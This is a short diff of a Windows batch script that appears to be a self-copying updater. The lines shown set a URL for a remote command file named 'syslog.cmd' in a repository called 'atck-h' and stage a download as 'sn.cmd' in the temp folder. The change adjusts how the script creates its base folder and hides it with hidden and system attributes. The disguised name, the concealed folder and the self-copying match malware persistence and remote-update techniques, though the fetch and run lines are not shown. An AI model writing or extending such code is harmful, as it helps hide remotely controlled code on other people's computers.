@@ -10,8 +10,10 @@ set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
 set "REMOTE_VER=%TEMP%\rv.txt"
 set "DOWNLOAD=%TEMP%\sn.cmd"
 
-if not exist "%BASE%" mkdir "%BASE%"
-attrib +h +s "%BASE%"
+if not exist "%BASE%" (
+    mkdir "%BASE%"
+    attrib +h +s "%BASE%"
+)
 
 :: Copy this updater to the base folder (if not already there)
 if /i not "%~f0"=="%UPDATER%" (
